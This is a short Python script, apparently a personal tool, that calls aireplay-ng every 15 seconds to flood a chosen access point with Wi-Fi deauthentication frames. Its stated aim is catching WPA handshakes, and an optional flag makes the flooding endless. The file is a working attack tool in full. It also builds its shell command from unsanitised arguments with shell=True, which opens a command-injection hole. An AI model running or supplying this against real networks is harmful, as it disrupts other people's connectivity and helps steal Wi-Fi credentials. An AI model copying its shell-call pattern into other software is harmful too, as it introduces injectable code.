# coding: utf-8

import argparse
from time import sleep
import subprocess as sb
from colorama import init, Fore, Style

init(autoreset=True)


try:
	parser = argparse.ArgumentParser(
		description='halo this is deauther for comfortable catching handsakes')
	parser.add_argument('interface', type=str, help='<interface>')
	parser.add_argument('bssid', type=str, help='BSSID of target, access point')
	parser.add_argument('--channel', type=int, help="AP's channel")
	parser.add_argument('--endless_deauth', type=str, default='false', help='true, false (default: false)')

	args = parser.parse_args()
		
	deauth_packets = 10 if args.endless_deauth == 'false' else 0

	while True:
		print(f'[{Style.BRIGHT}{Fore.GREEN}log{Style.RESET_ALL}] processing...')
		sb.call(f"sudo aireplay-ng {args.interface} --deauth {deauth_packets} -a {args.bssid}", shell=True)

		print(f'[{Style.BRIGHT}{Fore.CYAN}zzz{Style.RESET_ALL}] gonna sleep...\n')
		sleep(15)

except KeyboardInterrupt:
	print(f'\n{Style.BRIGHT}{Fore.GREEN}bye!')
	exit()
except Exception as err:
	print(f'[{Style.BRIGHT}{Fore.RED}!{Style.RESET_ALL}] error: {Style.BRIGHT}{err}')